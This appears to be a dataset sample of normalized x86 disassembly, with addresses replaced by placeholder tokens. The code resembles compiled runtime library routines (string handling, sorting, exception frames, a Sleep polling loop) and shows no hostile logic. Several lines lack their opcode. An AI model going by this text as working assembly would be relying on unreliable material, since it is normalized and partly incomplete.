sub_401010
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_419ff3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_401050
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea ecx [ eax + eax ]
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_41a460
add esp 0xc
pop ebp
retn
sub_401080
push ebp
mov ebp esp
push 0xffffffff
push sub_42cd60
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
call edx
sub_401100
push ebp
mov ebp esp
push 0xffffffff
push sub_42cd80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
mov edx [ eax ]
mov [ ebp - 0x4 ] 0x0
call edx
sub_4011b0
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
push esi
call sub_41a0d6
add esp 0x4
push eax
call sub_41a7eb
add esp 0x4
sub_4011e0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
lea eax [ edi - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp + 0x10 ] edi
jge r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx + edi * 4 ] ecx
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov edx [ ebx + esi * 4 ]
push ecx
push edx
call [ ebp + 0x18 ]
add esp 0x8
test al al
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebx + edi * 4 ] ecx
pop ebx
pop edi
pop esi
pop ebp
retn
mov eax [ ebx + esi * 4 ]
mov [ ebx + edi * 4 ] eax
lea eax [ esi - 0x1 ]
cdq
sub eax edx
mov edi esi
sar eax 0x1
mov esi eax
cmp [ ebp + 0x10 ] edi
jl r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov [ ebx + edi * 4 ] edx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_401280
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x9249249
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_419f97
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_41ac98
lea eax [ ecx * 8 ]
sub eax ecx
add eax eax
add eax eax
push eax
call sub_41ac18
add esp 0x4
test eax eax
jne r-xdata
sub_4012e0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_419f97
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_41ac98
lea eax [ ecx + ecx ]
push eax
call sub_41ac18
add esp 0x4
test eax eax
jne r-xdata
sub_401340
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_401370
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea esi [ ebx + ebx + 0x2 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp + 0xc ] ebx
cmp esi eax
jge r-xdata
jne r-xdata
lea ebx [ ebx ]
lea eax [ ebx - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp + 0xc ] ebx
jge r-xdata
mov ecx [ edi + eax * 4 - 0x4 ]
mov [ edi + ebx * 4 ] ecx
lea ebx [ eax - 0x1 ]
mov edx [ edi + esi * 4 ]
mov [ edi + ebx * 4 ] edx
mov ebx esi
lea esi [ esi + esi + 0x2 ]
cmp esi [ ebp + 0x10 ]
jl r-xdata
dec esi
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov [ edi + ebx * 4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x18 ]
add esp 0x8
test al al
je r-xdata
mov eax [ edi + esi * 4 - 0x4 ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x18 ]
add esp 0x8
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
cmp esi eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov [ edi + ebx * 4 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi + esi * 4 ]
lea eax [ esi - 0x1 ]
mov [ edi + ebx * 4 ] edx
cdq
sub eax edx
mov ebx esi
sar eax 0x1
mov esi eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ edi + ebx * 4 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_401430
push ebp
mov ebp esp
push esi
xor eax eax
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x9249249
jbe r-xdata
pop edi
xor al al
pop esi
pop ebp
retn 0x4
push edi
lea ecx [ esi + 0xc ]
call sub_401280
lea ecx [ edi * 8 ]
sub ecx edi
lea edx [ eax + ecx * 4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
pop edi
mov [ esi + 0x8 ] edx
mov al 0x1
pop esi
pop ebp
retn 0x4
push r--data
call sub_4194e6
sub_401490
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_419533
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_41a460
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_401520
push ebp
mov ebp esp
push 0xffffffff
push sub_42cda0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] 0x0
call sub_419f97
push r--data
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x24 ] r--data
call sub_41ac98
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_4012e0
mov [ ebp - 0x18 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_41a0d6
mov ecx [ ebp + 0xc ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_41a0f0
mov ecx [ ebp + 0xc ]
add esp 0xc
sub_401666
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_41ac98
int3
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
sub_4016a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42cdc0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_4030d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40171b
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_41ac98
int3
mov eax [ esi ]
test eax eax
je r-xdata
push esi
call sub_41a0d6
add esp 0x4
push eax
call sub_41a7eb
add esp 0x4
sub_401750
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
sub ecx edi
sar ecx 0x2
mov eax ecx
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
mov [ ebp + 0x8 ] ecx
test ebx ebx
jle r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ ebx + ebx + 0x2 ]
jmp r-xdata
mov eax [ edi + ebx * 4 - 0x4 ]
dec ebx
sub esi 0x2
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] eax
mov [ ebp + 0xc ] ebx
cmp esi ecx
jge r-xdata
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
push ebx
push eax
push edi
call sub_4011e0
add esp 0x14
test ebx ebx
jg r-xdata
mov edx [ edi + ecx * 4 - 0x4 ]
mov eax [ ebp + 0xc ]
dec ecx
mov [ edi + eax * 4 ] edx
mov [ ebp + 0xc ] ecx
mov ecx [ edi + esi * 4 - 0x4 ]
mov edx [ edi + esi * 4 ]
push ecx
push edx
call [ ebp + 0x10 ]
add esp 0x8
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp - 0x4 ]
pop esi
mov ecx [ ebp + 0xc ]
mov eax [ edi + esi * 4 ]
mov [ ebp + 0xc ] esi
lea esi [ esi + esi + 0x2 ]
mov [ edi + ecx * 4 ] eax
cmp esi [ ebp + 0x8 ]
jl r-xdata
dec esi
mov ecx [ ebp + 0x8 ]
cmp esi ecx
sub_401800
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
lea ebx [ esi + 0x4 ]
cmp ebx eax
je r-xdata
pop ebx
push edi
mov edx [ ebx - 0x4 ]
lea esi [ ebx - 0x4 ]
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test al al
je r-xdata
mov eax ebx
sub eax esi
sar eax 0x2
add eax eax
add eax eax
push eax
mov ecx ebx
sub ecx eax
add ecx 0x4
push esi
push ecx
call sub_41a460
add esp 0xc
mov [ esi ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
mov edi edi
add ebx 0x4
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ esi ]
mov edi [ ebx ]
push eax
push edi
mov [ ebp - 0x4 ] ebx
call [ ebp + 0x10 ]
add esp 0x8
test al al
je r-xdata
pop edi
mov ecx [ ebp - 0x4 ]
mov eax [ esi ]
mov [ ebp - 0x4 ] esi
mov [ ecx ] eax
mov edx [ esi - 0x4 ]
sub esi 0x4
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test al al
jne r-xdata
sub_4018a0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test al al
je r-xdata
mov eax [ esi ]
push ebx
mov ebx [ ebp + 0x10 ]
mov ecx [ ebx ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test al al
je r-xdata
mov edx [ edi ]
mov eax [ esi ]
mov [ esi ] edx
mov [ edi ] eax
mov eax [ edi ]
mov ecx [ esi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
pop ebx
test al al
je r-xdata
mov edx [ esi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ esi ] eax
pop edi
pop esi
pop ebp
retn
mov edx [ edi ]
mov eax [ esi ]
mov [ esi ] edx
mov [ edi ] eax
sub_401900
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor ecx ecx
mov [ esi ] cx
pop esi
retn
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
sub_401930
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0x7ffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_4194e6
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_401520
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x8
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
xor eax eax
mov [ esi ] ax
mov esi [ esi ]
cmp eax 0x8
jb r-xdata
mov edi ebx
xor edx edx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor ecx ecx
mov [ esi + edi * 2 ] dx
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_41a0d6
mov ebx [ ebp + 0x8 ]
add esp 0x4
lea ecx [ edi + edi ]
push ecx
push ebx
push esi
call sub_41a0f0
add esp 0xc
sub_401a10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push eax
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call sub_4016a0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_401a40
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
mov eax esi
sub eax ecx
sar eax 0x2
cmp eax 0x28
jle r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edx
push esi
push eax
push ecx
call sub_4018a0
add esp 0x10
pop esi
mov esp ebp
pop ebp
retn
inc eax
cdq
and edx 0x7
add eax edx
push ebx
mov ebx [ ebp + 0x14 ]
sar eax 0x3
push edi
lea edx [ eax * 8 ]
mov [ ebp + 0x10 ] edx
push ebx
lea edi [ eax * 4 ]
add edx ecx
lea eax [ edi + ecx ]
push edx
push eax
push ecx
mov [ ebp - 0x4 ] eax
call sub_4018a0
mov eax [ ebp + 0xc ]
push ebx
lea ecx [ edi + eax ]
push ecx
push eax
sub eax edi
push eax
call sub_4018a0
push ebx
mov eax esi
sub eax edi
push esi
sub esi [ ebp + 0x10 ]
push eax
push esi
mov [ ebp + 0x8 ] eax
call sub_4018a0
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
push ebx
push edx
push eax
push ecx
call sub_4018a0
add esp 0x40
pop edi
pop ebx
pop esi
mov esp ebp
pop ebp
retn
sub_401ae0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_419533
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0x7ffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_401490
push ebx
push 0x0
mov ecx esi
call sub_401490
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_4194e6
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_401520
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ esi ]
xor edx edx
mov [ ebx + eax ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
lea ebx [ edi + edi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_41a0f0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_401be0
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
mov eax ecx
sub eax ebx
sar eax 0x2
cdq
push esi
sub eax edx
sar eax 0x1
push edi
lea esi [ ebx + eax * 4 ]
mov eax [ ebp + 0x14 ]
push eax
add ecx 0xfffffffc
push ecx
push esi
push ebx
call sub_401a40
add esp 0x10
lea edi [ esi + 0x4 ]
mov [ ebp - 0x4 ] edi
cmp ebx esi
jae r-xdata
cmp edi [ ebp + 0x10 ]
jae r-xdata
lea ebx [ ebx ]
mov ebx esi
mov edi edi
mov edi edi
mov eax [ esi - 0x4 ]
mov ecx [ esi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
cmp ebx [ ebp + 0xc ]
jbe r-xdata
mov eax [ edi ]
mov ecx [ esi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ edi ]
mov edx [ esi ]
push ecx
push edx
call ebx
add esp 0x8
test al al
jne r-xdata
add esi 0xfffffffc
cmp ebx esi
jb r-xdata
jne r-xdata
mov eax [ esi ]
mov ecx [ ebx - 0x4 ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
add edi 0x4
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov edx [ esi ]
mov eax [ edi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
add edi 0x4
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov ecx [ esi ]
mov edx [ esi - 0x4 ]
push ecx
push edx
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
sub ebx 0x4
cmp edi [ ebp + 0x10 ]
jne r-xdata
cmp edi [ ebp + 0x10 ]
je r-xdata
add ebx 0xfffffffc
cmp [ ebp + 0xc ] ebx
jb r-xdata
mov edx [ ebx - 0x4 ]
mov eax [ esi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ edi ]
mov eax ecx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ecx [ eax ]
mov [ eax ] edx
mov [ edi ] ecx
mov edx [ esi ]
mov eax [ edi ]
mov ebx [ ebp + 0x14 ]
push edx
push eax
call ebx
add esp 0x8
test al al
jne r-xdata
mov eax [ edi ]
mov ecx [ ebx ]
mov [ edi ] ecx
mov [ ebx ] eax
add edi 0x4
jmp r-xdata
sub esi 0x4
cmp ebx esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
pop edi
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp eax edi
je r-xdata
cmp ebx [ ebp + 0xc ]
mov ecx [ ebx - 0x4 ]
mov eax [ esi - 0x4 ]
sub esi 0x4
mov [ esi ] ecx
mov [ ebx - 0x4 ] eax
cmp edi [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax - 0x4 ]
mov ecx [ esi ]
sub eax 0x4
mov [ esi ] edx
mov [ ebp - 0x4 ] eax
mov [ eax ] ecx
jmp r-xdata
mov edx [ esi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ esi ] eax
mov ecx esi
mov edx [ ecx ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax edi
mov [ ebp - 0x8 ] edx
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ ebp - 0x8 ]
add esi 0x4
add edi 0x4
mov [ eax ] ecx
jmp r-xdata
mov edx [ eax ]
mov ecx [ esi ]
mov [ esi ] edx
mov [ eax ] ecx
sub_401d90
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
mov ecx eax
and ecx 0xfffffffc
cmp ecx 0x4
jle r-xdata
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0x10 ]
push edi
jmp r-xdata
mov edx [ esi + eax - 0x4 ]
mov ecx [ esi ]
lea edi [ eax - 0x4 ]
mov [ esi + eax - 0x4 ] ecx
push ebx
mov [ ebp + 0xc ] edx
lea edx [ ebp + 0xc ]
push edx
mov eax edi
sar eax 0x2
push eax
push 0x0
push esi
call sub_401370
mov eax edi
mov ecx edi
and ecx 0xfffffffc
add esp 0x14
cmp ecx 0x4
jg r-xdata
pop edi
pop ebx
sub_401df0
push ebp
mov ebp esp
push 0xffffffff
push sub_42cdf0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x10 ] ebx
lea ecx [ ecx ]
push 0x1f4
call [ Sleep@IAT ]
dec [ ebp - 0x14 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0xc ]
call edx
xor esi esi
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
call sub_4016a0
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x20 ] esi
je r-xdata
mov ecx [ ebx + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
call edx
test al al
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov ecx [ ebx + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
sub esp 0x8
mov edi esp
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov esi [ ebp - 0x1c ]
mov [ ebp - 0x18 ] esp
test esi esi
je r-xdata
mov [ ebp - 0x14 ] 0x5
mov ecx [ ebx + 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
xor esi esi
push eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
call sub_4016a0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x28 ] esi
je r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebx + 0x18 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov esi [ ebp - 0x24 ]
sub esp 0x8
mov edi esp
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x18 ] esp
test esi esi
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov esi [ ebp - 0x1c ]
mov edi edi
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebx + 0x18 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov ecx [ edx ]
test ecx ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov esi [ ebp - 0x24 ]
lea esi [ ecx + 0x1 ]
mov ebx edx
mov eax ecx
[ ebx ] esi
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0x20 ]
mov esi [ ebp - 0x1c ]
mov ebx [ ebp - 0x10 ]
mov [ edi + 0x4 ] esi
mov [ edi ] ecx
mov ecx [ ebx + 0x18 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
lea esi [ ecx + 0x1 ]
mov ebx edx
mov eax ecx
[ ebx ] esi
cmp eax ecx
je r-xdata
mov ebx [ ebp - 0x10 ]
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov ecx [ edx ]
